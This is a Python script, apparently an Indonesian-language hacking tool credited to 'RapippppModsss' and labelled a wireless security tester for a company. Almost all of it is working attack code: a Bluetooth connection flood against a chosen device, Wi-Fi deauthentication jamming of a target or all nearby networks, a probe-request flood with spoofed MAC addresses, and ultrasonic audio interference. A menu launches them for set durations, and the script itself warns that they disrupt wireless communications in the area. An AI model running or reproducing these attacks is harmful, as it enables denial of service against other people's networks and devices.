#!/usr/bin/env python3
import asyncio
import time
import sys
import json
import threading
import subprocess
import random
from datetime import datetime
from bleak import BleakScanner, BleakClient
import bluetooth as bt
from bluetooth import BluetoothSocket, RFCOMM
import numpy as np
import pyaudio
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11ProbeReq
import os
import signal

class WirelessSecurityTester:
    def __init__(self):
        self.testing = False
        self.active_attacks = {
            'bluetooth_flood': False,
            'wifi_jamming': False,
            'probe_flood': False,
            'ultrasonic': False
        }
        
        self.results = {
            'vulnerabilities_found': [],
            'devices_tested': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'attack_duration': 0,
            'start_time': None,
            'end_time': None
        }
        
        self.target_devices = []
        self.log_entries = []
        self.attack_threads = []

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {level}: {message}"
        self.log_entries.append(log_entry)
        
        colors = {
            "INFO": "\033[94m",      # Blue
            "WARNING": "\033[93m",   # Yellow  
            "ERROR": "\033[91m",     # Red
            "SUCCESS": "\033[92m"    # Green
        }
        
        color = colors.get(level, "\033[0m")
        print(f"{color}{log_entry}\033[0m")

    # ===== BLUETOOTH FLOOD ATTACK (LONG DURATION) =====
    
    async def bluetooth_flood_attack_extended(self, target_address, duration_minutes=60):
        """Bluetooth Flood Attack dengan durasi panjang"""
        self.log(f"Memulai Extended Bluetooth Flood Attack ke {target_address} selama {duration_minutes} menit", "WARNING")
        
        start_time = time.time()
        end_time = start_time + (duration_minutes * 60)
        connection_attempts = 0
        successful_floods = 0
        
        while time.time() < end_time and self.active_attacks['bluetooth_flood']:
            try:
                # Multiple connection attempts per iteration
                tasks = []
                for i in range(10):  # 10 concurrent attempts
                    task = asyncio.create_task(self.attempt_bluetooth_connection(target_address))
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                batch_success = sum(1 for r in results if r is True)
                successful_floods += batch_success
                connection_attempts += len(tasks)
                
                elapsed = time.time() - start_time
                remaining = end_time - time.time()
                
                self.log(f"Bluetooth Flood Progress: {elapsed/60:.1f}m elapsed, {remaining/60:.1f}m remaining - Success: {batch_success}/10", "INFO")
                
                # Adaptive timing - lebih agresif jika success rate tinggi
                if batch_success > 5:
                    await asyncio.sleep(0.05)  # Very aggressive
                else:
                    await asyncio.sleep(0.2)   # Moderate
                    
            except Exception as e:
                self.log(f"Error dalam Bluetooth flood: {str(e)}", "ERROR")
                await asyncio.sleep(1)
        
        success_rate = (successful_floods / connection_attempts) * 100 if connection_attempts > 0 else 0
        self.log(f"Bluetooth Flood selesai: {successful_floods}/{connection_attempts} connections ({success_rate:.1f}%)", "SUCCESS")
        
        return success_rate

    async def attempt_bluetooth_connection(self, target_address):
        """Attempt single Bluetooth connection"""
        try:
            async with BleakClient(target_address, timeout=1.5) as client:
                if client.is_connected:
                    # Quick disconnect to simulate flood
                    await asyncio.sleep(0.01)
                    return True
        except:
            pass
        return False

    # ===== WI-FI JAMMING / DEAUTHENTICATION ATTACK =====
    
    def wifi_deauth_attack(self, interface="wlan0", target_bssid=None, duration_minutes=30):
        """Wi-Fi Deauthentication Attack (Jamming)"""
        self.log(f"📡 Memulai Wi-Fi Deauth Attack selama {duration_minutes} menit pada interface {interface}", "WARNING")
        
        def deauth_thread():
            start_time = time.time()
            end_time = start_time + (duration_minutes * 60)
            packet_count = 0
            
            while time.time() < end_time and self.active_attacks['wifi_jamming']:
                try:
                    # Create deauthentication packet
                    if target_bssid:
                        # Targeted deauth
                        packet = RadioTap() / Dot11(
                            type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff",
                            addr2=target_bssid, addr3=target_bssid
                        ) / Dot11Deauth(reason=7)
                    else:
                        # Broadcast deauth to all devices
                        packet = RadioTap() / Dot11(
                            type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff",
                            addr2="12:34:56:78:90:ab", addr3="12:34:56:78:90:ab"
                        ) / Dot11Deauth(reason=7)
                    
                    # Send multiple packets
                    for _ in range(10):
                        sendp(packet, iface=interface, verbose=0)
                        packet_count += 1
                    
                    elapsed = time.time() - start_time
                    remaining = end_time - time.time()
                    
                    if packet_count % 100 == 0:
                        self.log(f"Wi-Fi Jamming: {elapsed/60:.1f}m elapsed, {remaining/60:.1f}m remaining - Packets: {packet_count}", "INFO")
                    
                    time.sleep(0.1)  # Control packet rate
                    
                except Exception as e:
                    self.log(f"Error dalam Wi-Fi jamming: {str(e)}", "ERROR")
                    time.sleep(1)
            
            self.log(f"Wi-Fi Deauth Attack selesai: {packet_count} packets sent", "SUCCESS")
        
        thread = threading.Thread(target=deauth_thread)
        thread.daemon = True
        thread.start()
        return thread

    # ===== PROBE REQUEST FLOOD ATTACK =====
    
    def probe_request_flood(self, interface="wlan0", duration_minutes=30):
        """Probe Request Flood Attack"""
        self.log(f"🌐 Memulai Probe Request Flood Attack selama {duration_minutes} menit", "WARNING")
        
        def probe_flood_thread():
            start_time = time.time()
            end_time = start_time + (duration_minutes * 60)
            packet_count = 0
            
            # Common SSIDs untuk flooding
            ssid_list = [
                "PT_Abadi_Nan_Jaya", "HomeNetwork", "Free_WiFi", "Public_WiFi",
                "GuestNetwork", "Office_Network", "SecureNet", "Admin_Network",
                "Camera_System", "IoT_Network", "Employee_WiFi", "Conference_Room"
            ]
            
            while time.time() < end_time and self.active_attacks['probe_flood']:
                try:
                    # Random MAC address
                    random_mac = f"02:00:00:{random.randint(0x00, 0xff):02x}:{random.randint(0x00, 0xff):02x}:{random.randint(0x00, 0xff):02x}"
                    
                    # Random SSID dari list
                    ssid = random.choice(ssid_list)
                    
                    # Create probe request packet
                    packet = RadioTap() / Dot11(
                        type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
                        addr2=random_mac, addr3="ff:ff:ff:ff:ff:ff"
                    ) / Dot11ProbeReq() / (b'\x00' + ssid.encode())
                    
                    # Send multiple probe requests
                    for _ in range(5):
                        sendp(packet, iface=interface, verbose=0)
                        packet_count += 1
                    
                    elapsed = time.time() - start_time
                    remaining = end_time - time.time()
                    
                    if packet_count % 50 == 0:
                        self.log(f"Probe Flood: {elapsed/60:.1f}m elapsed, {remaining/60:.1f}m remaining - Packets: {packet_count}", "INFO")
                    
                    time.sleep(0.05)  # Very aggressive flooding
                    
                except Exception as e:
                    self.log(f"Error dalam probe flood: {str(e)}", "ERROR")
                    time.sleep(1)
            
            self.log(f"Probe Request Flood selesai: {packet_count} packets sent", "SUCCESS")
        
        thread = threading.Thread(target=probe_flood_thread)
        thread.daemon = True
        thread.start()
        return thread

    # ===== ULTRASONIC INTERFERENCE =====
    
    def ultrasonic_interference_extended(self, duration_minutes=30):
        """Extended Ultrasonic Interference Test"""
        self.log(f" Memulai Extended Ultrasonic Interference selama {duration_minutes} menit", "WARNING")
        
        def ultrasonic_thread():
            start_time = time.time()
            end_time = start_time + (duration_minutes * 60)
            
            try:
                p = pyaudio.PyAudio()
                
                while time.time() < end_time and self.active_attacks['ultrasonic']:
                    # Cycle through different ultrasonic frequencies
                    frequencies = [18000, 19000, 20000, 21000, 22000]
                    
                    for freq in frequencies:
                        if time.time() >= end_time or not self.active_attacks['ultrasonic']:
                            break
                            
                        self.log(f"Playing ultrasonic {freq}Hz", "INFO")
                        
                        # Generate ultrasonic signal
                        duration = 2  # seconds per frequency
                        sample_rate = 44100
                        t = np.linspace(0, duration, int(sample_rate * duration))
                        wave_data = np.sin(2 * np.pi * freq * t)
                        wave_data = np.int16(wave_data * 32767)
                        
                        stream = p.open(format=pyaudio.paInt16,
                                      channels=1,
                                      rate=sample_rate,
                                      output=True)
                        
                        stream.write(wave_data.tobytes())
                        stream.stop_stream()
                        stream.close()
                        
                        elapsed = time.time() - start_time
                        remaining = end_time - time.time()
                        self.log(f"Ultrasonic: {elapsed/60:.1f}m elapsed, {remaining/60:.1f}m remaining", "INFO")
                        
                        time.sleep(1)  # Brief pause between frequencies
                
                p.terminate()
                self.log("Ultrasonic Interference selesai", "SUCCESS")
                
            except Exception as e:
                self.log(f"Error dalam ultrasonic interference: {str(e)}", "ERROR")
        
        thread = threading.Thread(target=ultrasonic_thread)
        thread.daemon = True
        thread.start()
        return thread

    # ===== COMPREHENSIVE ATTACK LAUNCHER =====
    
    def launch_comprehensive_attack(self, attack_config):
        """Launch comprehensive wireless attacks berdasarkan config"""
        self.log("MEMULAI COMPREHENSIVE WIRELESS ATTACK", "WARNING")
        self.results['start_time'] = datetime.now().isoformat()
        self.testing = True
        
        # Set semua attacks ke active
        for attack in self.active_attacks:
            self.active_attacks[attack] = True
        
        attack_threads = []
        
        # Bluetooth Flood Attack
        if attack_config.get('bluetooth_flood'):
            target_addr = attack_config['bluetooth_target']
            duration = attack_config['bluetooth_duration']
            
            async def run_bluetooth_flood():
                success_rate = await self.bluetooth_flood_attack_extended(target_addr, duration)
                if success_rate > 25:
                    self.results['successful_attacks'] += 1
                    self.results['vulnerabilities_found'].append({
                        'type': 'bluetooth_flood',
                        'target': target_addr,
                        'success_rate': f"{success_rate:.1f}%",
                        'severity': 'HIGH',
                        'description': 'Perangkat rentan terhadap extended Bluetooth flooding'
                    })
                else:
                    self.results['failed_attacks'] += 1
            
            bluetooth_thread = threading.Thread(
                target=lambda: asyncio.run(run_bluetooth_flood())
            )
            bluetooth_thread.daemon = True
            bluetooth_thread.start()
            attack_threads.append(bluetooth_thread)
        
        # Wi-Fi Jamming
        if attack_config.get('wifi_jamming'):
            interface = attack_config.get('wifi_interface', 'wlan0')
            target_bssid = attack_config.get('wifi_target')
            duration = attack_config['wifi_duration']
            
            wifi_thread = self.wifi_deauth_attack(interface, target_bssid, duration)
            attack_threads.append(wifi_thread)
        
        # Probe Request Flood
        if attack_config.get('probe_flood'):
            interface = attack_config.get('wifi_interface', 'wlan0')
            duration = attack_config['probe_duration']
            
            probe_thread = self.probe_request_flood(interface, duration)
            attack_threads.append(probe_thread)
        
        # Ultrasonic Interference
        if attack_config.get('ultrasonic'):
            duration = attack_config['ultrasonic_duration']
            
            ultrasonic_thread = self.ultrasonic_interference_extended(duration)
            attack_threads.append(ultrasonic_thread)
        
        self.attack_threads = attack_threads
        self.log("Semua attacks telah diluncurkan!", "SUCCESS")
        
        return attack_threads

    def stop_all_attacks(self):
        """Stop semua active attacks"""
        self.log("🛑 MENGHEMTIKAN SEMUA ATTACKS", "WARNING")
        
        for attack in self.active_attacks:
            self.active_attacks[attack] = False
        
        self.testing = False
        self.results['end_time'] = datetime.now().isoformat()
        
        # Calculate total duration
        if self.results['start_time'] and self.results['end_time']:
            start = datetime.fromisoformat(self.results['start_time'])
            end = datetime.fromisoformat(self.results['end_time'])
            self.results['attack_duration'] = str(end - start)
        
        self.log("Semua attacks telah dihentikan", "SUCCESS")
        self.generate_final_report()

    def generate_final_report(self):
        """Generate comprehensive security report"""
        filename = f"wireless_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        report = {
            'company': 'PT Abadi Nan Jaya Network for Home',
            'test_date': datetime.now().isoformat(),
            'test_duration': self.results['attack_duration'],
            'results': self.results,
            'recommendations': self.generate_recommendations(),
            'logs': self.log_entries[-100:]  # Last 100 logs
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.log(f"📊 Laporan keamanan disimpan: {filename}", "SUCCESS")
        
        # Print summary
        self.print_attack_summary()
        
        return filename

    def generate_recommendations(self):
        """Generate security recommendations"""
        recommendations = []
        
        vulnerabilities = [v['type'] for v in self.results['vulnerabilities_found']]
        
        if 'bluetooth_flood' in vulnerabilities:
            recommendations.extend([
                "Implementasi Bluetooth connection rate limiting",
                "Gunakan Bluetooth versi 4.2+ dengan LE Secure Connections",
                "Non-aktifkan Bluetooth ketika tidak digunakan"
            ])
        
        if any('wifi' in vuln for vuln in vulnerabilities):
            recommendations.extend([
                "Implementasi WiFi intrusion detection system",
                "Gunakan WPA3 security protocol",
                "Monitor abnormal deauthentication frames",
                "Implementasi MAC address filtering",
                "Gunakan hidden SSID untuk sensitive networks"
            ])
        
        recommendations.extend([
            "Regular wireless security audits",
            "Employee training tentang wireless security threats",
            "Implementasi network segmentation",
            "Monitor wireless spectrum secara berkala"
        ])
        
        return recommendations

    def print_attack_summary(self):
        """Print attack summary"""
        print("\n" + "="*80)
        print("🎯 WIRELESS SECURITY TESTING SUMMARY - PT Abadi Nan Jaya")
        print("="*80)
        
        print(f"\n📊 TEST RESULTS:")
        print(f"   Duration: {self.results['attack_duration']}")
        print(f"   Successful Attacks: {self.results['successful_attacks']}")
        print(f"   Failed Attacks: {self.results['failed_attacks']}")
        print(f"   Vulnerabilities Found: {len(self.results['vulnerabilities_found'])}")
        
        if self.results['vulnerabilities_found']:
            print(f"\n🚨 VULNERABILITIES DETECTED:")
            for vuln in self.results['vulnerabilities_found']:
                print(f"   🔴 {vuln['type'].upper()} - {vuln['severity']} Severity")
                print(f"      {vuln['description']}")
        
        print(f"\n🛡️  TOP RECOMMENDATIONS:")
        for rec in self.generate_recommendations()[:5]:
            print(f"   ✅ {rec}")

    # ===== INTERACTIVE MENU =====
    
    def interactive_menu(self):
        """Interactive menu untuk comprehensive testing"""
        while True:
            print("\n" + "="*70)
            print("BLUETOOTH & WIFI TOOLS")
            print("By RapippppModsss")
            print("="*70)
            print("1. Launch Comprehensive Attack (All Attacks)")
            print("2. Bluetooth Flood Attack Only")
            print("3. WiFi Jamming + Probe Flood Only") 
            print("4. Stop All Attacks")
            print("5. Show Current Status")
            print("6. Generate Report")
            print("7. Exit")
            print("-"*70)
            
            if self.testing:
                print("🔴 ATTACKS ACTIVE - Devices should be experiencing interference")
            
            choice = input("\nPilih menu (1-7): ").strip()
            
            if choice == '1':
                self.launch_comprehensive_attack_menu()
            elif choice == '2':
                self.bluetooth_only_menu()
            elif choice == '3':
                self.wifi_only_menu()
            elif choice == '4':
                self.stop_all_attacks()
            elif choice == '5':
                self.show_current_status()
            elif choice == '6':
                self.generate_final_report()
            elif choice == '7':
                if self.testing:
                    self.stop_all_attacks()
                self.log("Terima kasih telah menggunakan Wireless Security Testing Tool", "INFO")
                break
            else:
                self.log("Pilihan tidak valid", "ERROR")

    def launch_comprehensive_attack_menu(self):
        """Menu untuk comprehensive attack"""
        print("\n🎯 COMPREHENSIVE ATTACK CONFIGURATION")
        
        config = {}
        
        # Bluetooth Configuration
        print("\n🔵 BLUETOOTH FLOOD ATTACK:")
        config['bluetooth_flood'] = input("Enable Bluetooth flood? (y/n): ").lower() == 'y'
        if config['bluetooth_flood']:
            config['bluetooth_target'] = input("Target MAC address: ").strip()
            config['bluetooth_duration'] = int(input("Duration (minutes): ") or "60")
        
        # WiFi Configuration
        print("\n📡 WI-FI ATTACKS:")
        config['wifi_jamming'] = input("Enable WiFi jamming? (y/n): ").lower() == 'y'
        config['probe_flood'] = input("Enable probe request flood? (y/n): ").lower() == 'y'
        
        if config['wifi_jamming'] or config['probe_flood']:
            config['wifi_interface'] = input("Wireless interface [wlan0]: ").strip() or "wlan0"
            if config['wifi_jamming']:
                config['wifi_target'] = input("Target BSSID (optional): ").strip() or None
                config['wifi_duration'] = int(input("Jamming duration (minutes): ") or "30")
            if config['probe_flood']:
                config['probe_duration'] = int(input("Probe flood duration (minutes): ") or "30")
        
        # Ultrasonic Configuration
        print("\n🔊 ULTRASONIC INTERFERENCE:")
        config['ultrasonic'] = input("Enable ultrasonic interference? (y/n): ").lower() == 'y'
        if config['ultrasonic']:
            config['ultrasonic_duration'] = int(input("Duration (minutes): ") or "30")
        
        # Confirm and launch
        print(f"\n⚠️  CONFIRM LAUNCH ATTACKS?")
        print("This will disrupt wireless communications in the area!")
        confirm = input("Type 'LAUNCH' to confirm: ")
        
        if confirm == 'LAUNCH':
            self.launch_comprehensive_attack(config)
        else:
            self.log("Attack cancelled", "INFO")

    def bluetooth_only_menu(self):
        """Bluetooth only attack menu"""
        target = input("Bluetooth target MAC: ").strip()
        duration = int(input("Duration (minutes): ") or "60")
        
        config = {
            'bluetooth_flood': True,
            'bluetooth_target': target,
            'bluetooth_duration': duration,
            'wifi_jamming': False,
            'probe_flood': False,
            'ultrasonic': False
        }
        
        self.launch_comprehensive_attack(config)

    def wifi_only_menu(self):
        """WiFi only attack menu"""
        interface = input("Wireless interface [wlan0]: ").strip() or "wlan0"
        duration = int(input("Duration (minutes): ") or "30")
        
        config = {
            'bluetooth_flood': False,
            'wifi_jamming': True,
            'probe_flood': True,
            'wifi_interface': interface,
            'wifi_duration': duration,
            'probe_duration': duration,
            'ultrasonic': False
        }
        
        self.launch_comprehensive_attack(config)

    def show_current_status(self):
        """Show current attack status"""
        print("\n" + "="*50)
        print("📊 CURRENT ATTACK STATUS")
        print("="*50)
        
        for attack, active in self.active_attacks.items():
            status = "🔴 ACTIVE" if active else "🟢 INACTIVE"
            print(f"{attack.upper():<20} {status}")
        
        if self.results['start_time']:
            print(f"\nStart Time: {self.results['start_time']}")
        if self.results['vulnerabilities_found']:
            print(f"\nVulnerabilities Found: {len(self.results['vulnerabilities_found'])}")

def main():
    """Main function"""
    print("\033[1;36m")
    print("="*80)
    print("📡 COMPREHENSIVE WIRELESS SECURITY TESTING TOOL")
    print("PT Abadi Nan Jaya Network for Home")
    print("Bluetooth Flood + WiFi Jamming + Probe Request Flood")
    print("="*80)
    print("\033[0m")
    
    # Check dependencies
    try:
        import bleak
        import pyaudio
        import numpy as np
        from scapy.all import *
    except ImportError as e:
        print("Error: Dependencies tidak terinstall.")
        print("Install dengan: pip install bleak pyaudio numpy scapy")
        sys.exit(1)
    
    # Check if running as root (required for WiFi attacks)
    if os.geteuid() != 0:
        print("⚠️  Warning: Run as root for full WiFi functionality")
        print("   Some features may not work properly")
    
    tester = WirelessSecurityTester()
    
    # Setup signal handler for graceful shutdown
    def signal_handler(sig, frame):
        print("\n\n🛑 Received shutdown signal...")
        tester.stop_all_attacks()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        tester.interactive_menu()
    except Exception as e:
        print(f"Error: {str(e)}")
        tester.stop_all_attacks()

if __name__ == "__main__":
    main()